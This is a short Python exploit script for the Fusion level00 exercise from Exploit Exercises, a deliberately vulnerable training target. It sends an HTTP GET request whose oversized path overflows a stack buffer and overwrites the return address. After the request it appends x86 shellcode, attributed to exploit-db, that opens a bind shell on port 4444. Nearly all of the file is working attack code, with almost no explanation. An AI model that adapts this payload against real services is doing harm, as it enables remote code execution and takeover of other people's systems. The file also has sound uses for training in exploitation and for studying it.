# https://exploit-exercises.com/fusion/level00/
import socket
import struct

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_address = ('localhost', 20000)
sock.connect(server_address)

# GET path...retaddr HTTP/1.1shellcode

retaddr = 0xbffff8f8 + 4 + 143 + 9
path = "A"*139 + struct.pack("<I", retaddr)
# https://www.exploit-db.com/exploits/40056/
shellcode = "\x31\xc0\x31\xdb\x50\xb0\x66\xb3\x01\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x31\xd2\x52\x66\x68" + \
            "\x11\x5c" + \
            "\x66\x6a\x02\x89\xe1\xb0\x66\xb3\x02\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x56" + \
            "\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x03\xb0\x3f" + \
            "\xcd\x80\xfe\xc9\x79\xf8\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xcd\x80"
payload = "GET " + path + " HTTP/1.1" + shellcode 

sock.send(payload)

sock.close()
